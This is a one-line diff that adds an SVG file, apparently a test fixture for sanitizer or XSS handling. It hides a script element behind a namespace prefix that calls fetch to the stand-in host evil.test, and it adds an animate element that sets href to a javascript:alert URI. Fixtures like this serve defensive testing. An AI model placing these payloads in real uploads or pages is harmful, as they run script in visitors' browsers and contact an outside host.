@@ -1,0 +1,1 @@
+<s:svg xmlns:s="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><s:script>fetch('http://evil.test/c')</s:script><s:rect width="10" height="10"/><s:animate attributeName="href" to="javascript:alert(1)"/></s:svg>
